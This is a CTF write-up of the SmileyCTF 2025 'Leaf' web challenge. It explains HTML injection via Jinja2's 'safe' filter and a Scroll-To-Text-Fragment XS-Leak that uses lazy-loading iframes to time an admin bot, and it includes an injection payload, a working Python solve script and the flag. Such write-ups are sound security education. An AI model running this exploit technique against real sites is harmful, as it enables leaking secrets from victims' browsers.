---
ctf: SmileyCTF
title: Leaf
authors:
    - name: Chara
      url: https://ctf.gg/members/chara
description: I always think leaf ~= tea. Please allow remote to have some time to boot the browser.
categories:
    - web
difficulty: Hard
ctf_year: 2025
challengefiles: leaf
published: "2025-06-09"
---

# TL;DR<a id="TL;DR"></a>

    **- Challenge Setup:** Small website reflecting user input via URL query parameter
    **- Key Discoveries:** Due to **Jinja2** `safe` attribute you basically have **HTML** injection
    **- Vulnerability:** The website is vulnerable to a special form of **XSLeak**: **STTF** - **Scroll-To-Text-Fragment**
    **- Exploitation:** By injecting lazy loading iframes, you can measure the time it takes for the bot to load the website

# 1. Introduction<a id="introduction"></a>

The challenge setup is very minimalistic. You only have the index page reflecting user input via the `leaf` URL parameter, but in a very special way:

![landing-page](ctf/writeups/smileyctf/leaf/landing_page.png "landing-page")

For testing purposes, you can also create a `flag` cookie, which is also reflected by the website. As you can see, the **JavaScript** is transforming every text in the **HTML** tags with the `leaf` class into a text consisting of `span` tags, separating each character from each other. But it doesn't affect the visuals of the text. Moreover, there is a `/bot` endpoint on which you can send your `leaf` to a bot that will visit it.

# 2. Reconnaissance<a id="reconnaissance"></a>

Having a closer look at the source code of the challenge reveals `<div class="leaf">{{ leaves | safe}}</div>`. The `safe` keyword tells the underlying templating engine, **Jinja2**, that this content is safe and there is no need to escape it. This is very interesting, as we control everything that goes into this `leaf` tag. The applied **CSP** is very strict with `default-src 'none'; script-src 'nonce-{nonce}'; style-src 'nonce-{nonce}'; base-uri 'none'; frame-ancestors 'none';`. We can't even frame the website and **CSS** and **JavaScript** are only permitted with the correct nonce, which is generated safely. So basically, this challenge is all about putting the correct payload into the `leaf` URL parameter. In a comment, there is a hint that the flag starts with `d0nt`.

# 3. Vulnerability Description<a id="vulnerability description"></a>

As already mentioned, due to the `safe` keyword, we have **HTML** injection via the `leaf` URL parameter. But we can't execute any **JavaScript**, so this has to be some different form of XSS.
This is where we get to **XSLeak**, a special form of a side channel with which you can infer information by observing small information the website is leaking, like status codes, errors, timing, etc. There is a great [resource](https://xsleaks.dev/) for these kinds of attacks.
The `span` elements strongly hint that this is all about [STTF XSLeak](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/). Usually [Scroll-To-Text-Fragment](https://github.com/WICG/scroll-to-text-fragment) is used to automatically scroll to some specific part of a website matching the given URL fragment. This is, for example, used by search engines, linking directly to the part of the resource interesting to the user. The browser will scroll to this part after the website finishes loading. The generic syntax for **STTF** is `:~:text=[prefix-,]textStart[,textEnd][,-suffix]`. So, applied to our web challenge, you can do something like `/?leaf=testleaf#:~:text=testleaf`. In most of the challenges which are about **STTF** vulnerabilities, the website applies these `span` elements to the content, so it is possible to brute force the flag char by char. Without this modification, you could only match whole words and not parts of the text, making a char by char brute force attack impossible.
Now this is where it gets interesting. We can make the bot scroll around on the website. Either to a part of the flag or to other content on the page. So we need to find a way to distinguish correct characters from wrong ones. This is where `lazy loading iframes` come into play. The [lazy loading](https://developer.mozilla.org/de/docs/Web/Performance/Guides/Lazy_loading) attribute makes elements only load their source when they get near the viewport of your browser. Unfortunately, we can't specify a source for the iframes because of the **CSP** having `default-src 'none'`. However, iframes still try to load the source specified by their `src` attribute, which will eventually be blocked by the **CSP**. Having a lot of these iframes will make the website lag for a short time. Thanks to the `implicitly_wait` in the source code of the bot, we can just measure the time it takes for the bot to respond to our request after visiting our `leaf`.

# 4. Exploitation<a id="exploitation"></a>

So, at first, we need to make sure that we can inject arbitrary **HTML** into the website. The **JavaScript** applying the `span` tags destroys our payload, so we need to escape out of the `leaf` element by starting with a closing `</div>`. After that, we need to make sure the injected iframes are not right away in the viewport. We can just do this with some `</br>` tags, moving the iframes to a lower part of the website. At the bottom of the page, we just spam iframes as much as we can. We just have to be careful not to trigger a `414 URI Too Long`.
Moreover, we need to make the iframes small enough by applying `width=0 height=0` so all of them are present in the viewport and thus lazy load their source when being scrolled to.
But there is still one problem: **STTF** is case insensitive, which means you get the same behaviour with `/?leaf=testleaf#:~:text=testleaf` as with `/?leaf=testleaf#:~:text=testLEAF`. For this reason, we just assume there are only lowercase characters in the flag.
Between the iframes, we place a special string `FLAG_NOT_FOUND` which is scrolled to when the guessed character is wrong. So, for now, our payload is as follows:

```sql
</div>A</br>A</br>...</br>A<iframe src=x loading=lazy width=0 height=0></iframe>...<iframe src=x loading=lazy width=0 height=0></iframe>FLAG_NOT_FOUND<iframe src=x loading=lazy width=0 height=0></iframe>...<iframe src=x loading=lazy width=0 height=0></iframe>#:~:text=d0nta&text=FLAG_NOT_FOUND
```

We can enhance this payload even more. Instead of going through char by char, we can group the characters and just do a binary search. One of the characteristics of **STTF** is that only the leftmost successfully matched directive will be scrolled to. So we can add even more `text` directives to our query, resulting in something like:

```sql
#:~:text=d0nta&text=d0ntb&text=d0ntc...text=d0nt9&text=FLAG_NOT_FOUND
```

Now that we have our payload we just need to measure the time it takes for the bot to respond to our request with the first half of the characters and for the second half. The half with the lower response time is the one containing the correct next flag character, so we keep going like this recursively until only one character is left. Then just repeat this process.
You just need to be careful as the flag format `.;,;.{` and `}` were stripped out of the flag, we can't wait until we hit `}`. As a termination condition, we can just calculate the difference between the two response times. If the difference is not big enough or both response times exceed a certain time limit, we have already got the full flag.

# 5. Mitigation<a id="mitigation"></a>

In general, preventing XSLeaks is a pretty tough challenge. But in the first place this exploit could have been completely prevented by not applying the **Jinja2** `safe` keyword to untrusted input.

# 6. Solve Script<a id="solve script"></a>

```python
# .;,;.{d0ntul0v3th1sf34tur3}

import requests, time, base64
from statistics import mean
import string
import urllib3

BASE_URL = "http://localhost:8800"
FLAG = 'test'
BASE_URL = "https://web-leaf-chx8mbzz.smiley.cat"
FLAG = 'd0nt'

BOT_ENDPOINT = f"{BASE_URL}/bot"

FLAG_CHARS = string.ascii_lowercase +  string.digits + '{}_.-'
TRIES = 2
TIMEOUT = 5

def generate_br_string(length):
    return '</br>'.join('A' for _ in range(length))

def measure_latency(payload):
    b64 = base64.b64encode(payload.encode()).decode()
    params = {'leaf': b64}
    times = []
    for _ in range(TRIES):
        try:
            t0 = time.time()
            r = requests.get(BOT_ENDPOINT, params=params, timeout=TIMEOUT, allow_redirects=False)
            t1 = time.time()
            dif = t1 - t0
            times.append(dif)
        except (TimeoutError, urllib3.exceptions.ReadTimeoutError, requests.exceptions.ReadTimeout):
            times.append(TIMEOUT)
    return mean(times)

def generate_payload(candidates):
    global FLAG

    lazy_iframe = """<iframe src=x loading=lazy width=0 height=0></iframe>"""
    candidates_string = "FLAG_NOT_FOUND"
    frag = "#:~:text=" + "&text=".join(f"{FLAG}{c}" for c in candidates) + "&text=FLAG_NOT_FOUND"
    num_br = 200
    iframe_num = 400
    payload = '</div>' + generate_br_string(num_br) + (lazy_iframe * iframe_num) + candidates_string + (lazy_iframe * iframe_num) + frag
    mean_time = measure_latency(payload)
    print(f"\t\t[-] Mean time: {mean_time:.3f}s")
    return mean_time

last_min_mean_time = 0
while last_min_mean_time < 2.9:
    print(f"[*] Current flag: {FLAG}")
    search = FLAG_CHARS
    while len(search) > 1:
        first = search[::2]
        second = search[1::2]
        print(f"\t\t[-] Trying first half  ({len(first)}): {first}")
        print(f"\t\t[-] Trying second half ({len(second)}): {second}")

        mean_time_first = generate_payload(list(first))
        mean_time_second = generate_payload(list(second))

        if mean_time_first < mean_time_second:
            search = first
            print("\t[1] Found character in first half")
        else:
            search = second
            print("\t[2] Found character in second half")
        last_min_mean_time = min(mean_time_first, mean_time_second)

    FLAG += search[0]

print(f"[*] Final flag: .;,;.{{{FLAG}}}")

```

# 7. Flag<a id="flag"></a>

.;,;.{d0ntul0v3th1sf34tur3}
